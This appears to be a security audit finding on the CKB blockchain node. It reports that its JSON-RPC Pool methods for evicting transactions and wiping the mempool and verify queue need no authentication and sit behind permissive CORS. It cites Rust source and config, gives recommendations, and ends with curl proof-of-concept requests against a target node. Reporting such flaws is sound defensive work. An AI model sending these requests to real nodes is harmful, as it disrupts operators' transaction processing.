### Title
Unauthenticated Pool RPC Methods Allow Any Caller to Remove or Wipe Queued Transactions — (`File: rpc/src/module/pool.rs`, `rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC server exposes privileged tx-pool mutation methods — `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` — in the `Pool` module (enabled by default) with **no authentication or caller authorization**. The HTTP server is built with `CorsLayer::permissive()` and no middleware enforcing any credential check. Any reachable RPC caller can silently evict specific pending/proposed transactions or wipe the entire mempool.

---

### Finding Description

The RPC server is assembled in `rpc/src/server.rs`. The Axum router is constructed with no authentication layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← any origin allowed
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [1](#0-0) 

No token, bearer, IP-allowlist, or any other authentication middleware is present anywhere in `rpc/src/`. The only protection is the `listen_address` default of `127.0.0.1:8114`, which is a configuration recommendation, not an enforced control. [2](#0-1) 

The `Pool` module (enabled by default in the standard `modules` list) declares three state-mutating methods with no access guard:

| Method | Effect |
|---|---|
| `remove_transaction(tx_hash)` | Removes a specific tx and all its descendants from the pool |
| `clear_tx_pool()` | Wipes the entire mempool |
| `clear_tx_verify_queue()` | Wipes the entire verification queue | [3](#0-2) [4](#0-3) [5](#0-4) 

Their implementations perform the operations unconditionally:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { ... })
}

fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot).map_err(|err| ...)?;
    Ok(())
}

fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_verify_queue().map_err(|err| ...)?;
    Ok(())
}
``` [6](#0-5) 

The `Pool` module is included in the default `modules` list in the shipped `ckb.toml`:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [7](#0-6) 

The `ServiceBuilder` mounts all Pool methods when `pool_enable()` returns true, with no per-method privilege distinction: [8](#0-7) 

---

### Impact Explanation

**Targeted transaction eviction**: An attacker who can reach the RPC endpoint calls `remove_transaction` with the hash of any pending or proposed transaction. The call removes that transaction and all its descendants from the pool. The transaction submitter has no recourse — the node operator cannot prevent this because there is no mechanism to restrict which callers may invoke the method.

**Full mempool wipe**: `clear_tx_pool` drops every pending and proposed transaction simultaneously. For a mining node, this destroys all fee-bearing work queued for the next block template. For a relay node, it forces all transactions to be re-submitted and re-verified.

**Verify-queue wipe**: `clear_tx_verify_queue` drops all transactions currently undergoing script verification, causing them to be silently lost (they are not re-queued automatically).

The analog to the external report is direct: just as `executeProposal` in `BaseBridgeReceiver` was callable by any user to trigger execution of a queued governance action, `remove_transaction` / `clear_tx_pool` / `clear_tx_verify_queue` are callable by any RPC user to manipulate the queued transaction state — with no authorization check at any layer.

---

### Likelihood Explanation

- The `Pool` module is **on by default**. No operator action is required to expose these methods.
- Many CKB node operators bind the RPC to `0.0.0.0` for remote miner connectivity (the miner client calls `get_block_template` and `submit_block` over RPC). This exposes the entire Pool module to the network.
- The server uses `CorsLayer::permissive()`, so any web origin can issue cross-origin requests. If a user with a locally-bound node visits a malicious page, the page can call `clear_tx_pool` via `fetch("http://127.0.0.1:8114", ...)` — browsers do not universally block cross-origin requests to localhost when CORS headers explicitly permit them.
- No credential, token, or IP-allowlist is enforced in code; the only mitigation is operator discipline in firewall configuration.

---

### Recommendation

1. **Add an authentication layer** to the RPC server (e.g., a configurable bearer token or HTTP Basic Auth middleware in `rpc/src/server.rs`) that gates all state-mutating Pool methods.
2. **Separate read-only from write methods** within the Pool module, or introduce a per-method privilege annotation so that `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` require an explicit operator credential even when the Pool module is enabled.
3. **Replace `CorsLayer::permissive()`** with a restrictive CORS policy (e.g., same-origin only, or an explicit allowlist) to eliminate the cross-origin attack surface.
4. Document clearly that enabling the Pool module on a network-accessible address exposes destructive operations.

---

### Proof of Concept

Assuming the node's RPC is reachable at `http://<node-ip>:8114` (common for remote mining setups):

```bash
# Wipe the entire mempool of a target node
curl -s -X POST http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
# → {"jsonrpc":"2.0","result":null,"id":1}

# Remove a specific high-value pending transaction
curl -s -X POST http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction","params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],"id":2}'
# → {"jsonrpc":"2.0","result":true,"id":2}

# Wipe the verify queue (drops all transactions under script verification)
curl -s -X POST http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[],"id":3}'
# → {"jsonrpc":"2.0","result":null,"id":3}
```

No credentials, tokens, or signatures are required. The calls succeed immediately. The node operator has no in-protocol mechanism to prevent or reverse the eviction.

### Citations

**File:** rpc/src/server.rs (L97-130)
```rust
    fn start_server(
        rpc: &Arc<MetaIoHandler<Option<Session>>>,
        address: String,
        handler: Handle,
        enable_websocket: bool,
    ) -> Result<SocketAddr, AnyError> {
        let stream_config = StreamServerConfig::default()
            .with_keep_alive(true)
            .with_pipeline_size(4)
            .with_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });

        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

```

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L349-350)
```rust
    #[rpc(name = "clear_tx_verify_queue")]
    fn clear_tx_verify_queue(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-700)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }

    fn tx_pool_info(&self) -> Result<TxPoolInfo> {
        let tx_pool = self.shared.tx_pool_controller();
        let get_tx_pool_info = tx_pool.get_tx_pool_info();
        if let Err(e) = get_tx_pool_info {
            error!("Send get_tx_pool_info request error {}", e);
            return Err(RPCError::ckb_internal_error(e));
        };

        let tx_pool_info = get_tx_pool_info.unwrap();

        Ok(tx_pool_info.into())
    }

    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** resource/ckb.toml (L190-193)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```
